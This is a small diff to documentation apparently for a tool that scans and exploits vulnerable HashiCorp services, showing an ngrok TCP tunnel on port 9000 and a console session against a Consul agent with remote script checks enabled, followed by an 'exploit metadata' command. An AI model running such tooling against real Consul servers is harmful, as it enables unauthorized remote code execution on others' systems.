@@ -21,12 +21,14 @@ Scanning / Exploiting vulnerable hashicorp tools
 Start ngrok
 ./ngrok tcp 9000
 
+```console
 Connected <http://127.0.0.1:8500>$ check status
 DisableRemoteExec: true
 EnableRemoteScriptChecks: true
 NodeName: mini.hsd1.wa.comcast.net
 Version: 1.9.3
 Server: true
+```
 
 Connected <http://127.0.0.1:8500>$ exploit metadata
 ----
